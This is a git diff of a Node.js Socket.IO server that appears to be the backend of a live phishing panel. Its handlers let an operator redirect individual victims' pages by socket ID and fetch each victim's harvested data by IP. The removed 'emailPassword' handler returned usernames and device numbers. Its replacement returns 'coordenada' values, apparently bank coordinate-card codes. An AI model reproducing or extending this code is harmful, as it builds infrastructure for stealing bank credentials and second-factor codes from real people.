@@ -18,7 +18,7 @@ connectdb()
 const app = express()
 const httpServer = createServer(app)
 const io = new Server(httpServer, { 
-    cors: ['https://*.repl', 'http://localhost:3000', 'http://localhost:3001'] 
+    cors: ['https://*.repl', 'http://localhost:3000', 'http://localhost:3002'] 
 })
 
 app.use(cors())
@@ -53,27 +53,22 @@ io.on("connection", async(socket) => {
 
     // MODE LIVE
     socket.on('[LIVE] changeUrlPanel', async({user}) => { 
-        const {socketID, viewError, url } = user
+        const {socketID, viewError, url, coordenada1, coordenada2 } = user
         const newUser = await changeLive({user}) 
-        io.to(socketID).emit('[LIVE] changeUrlClient', {url, viewError} )
+        console.log(coordenada1, coordenada2)
+        io.to(socketID).emit('[LIVE] changeUrlClient', {url, viewError, coordenada1, coordenada2} )
         socket.emit('[User] newUser', newUser)
     })
 
-    socket.on('disconnect', async(e) => {
-        const usuario = await disconnectLive({socketID: socket.id}) 
-        if(usuario === null) return
-        console.log('hizo el caster')
-        return socket.broadcast.to('p0*aBfKPHio*2wJbt6>42)<LlDJ3').emit('[User] newUser', usuario)
-    })
-
-    socket.on('[LIVE] emailPassword', async(ip, cb) => {
+    socket.on('[LIVE] coordenada', async(ip, cb) => {
         try {
-            const {username, typeDevice, numberDevice} = await getUser({ip: ip.ip})
-            cb({username, typeDevice, numberDevice})
+            const {coordenada1, coordenada2} = await getUser({ip: ip.ip})
+            cb({coordenada1, coordenada2})
         } catch (error) {
             
         }
     })
+
 })
 
 app.get('/', (req, res) => console.log('testeando'))
@@ -83,4 +78,4 @@ app.get('/', (req, res) => console.log('testeando'))
 app.use(express.static("public"))
 
 
-httpServer.listen(3001, () => console.log(`conectado al servidor ${3001}`) )
+httpServer.listen(3002, () => console.log(`conectado al servidor ${3002}`) )
